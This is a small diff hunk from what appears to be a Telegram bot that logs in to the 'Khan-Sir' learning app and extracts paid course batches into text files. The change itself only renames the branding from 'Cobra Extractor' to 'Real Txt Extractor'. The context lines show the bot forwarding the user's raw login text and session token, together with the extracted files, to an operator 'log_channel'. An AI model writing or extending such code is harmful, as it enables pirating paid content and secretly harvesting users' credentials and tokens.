@@ -118,7 +118,7 @@ async def khan_login(app, message):
         
         dl = (f"<blockquote>KHAN SIR LOGIN SUCCESS\n\n `{raw_text}`\n\n`{token}`\n{FFF}</blockquote>")
         credit = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})\n\n"
-        c_txt = f"**App Name: Khan-Sir\nBatch Name:** `{batch_name}`\n** Batch Price - Rs**{course_price}\n**Expiry Date:-**{c_expire_at}\n **Extracted BY:{credit}** \n\n  **╾───• Cobra Extractor •───╼** "
+        c_txt = f"**App Name: Khan-Sir\nBatch Name:** `{batch_name}`\n** Batch Price - Rs**{course_price}\n**Expiry Date:-**{c_expire_at}\n **Extracted BY:{credit}** \n\n  **╾───• Real Txt Extractor •───╼** "
         await message.reply_document(document=f"{raw_text3}_{batch_name}.txt", caption=c_txt)
         await app.send_document(log_channel, document=f"{raw_text3}_{batch_name}.txt", caption=c_txt)
         await app.send_message( log_channel ,dl )
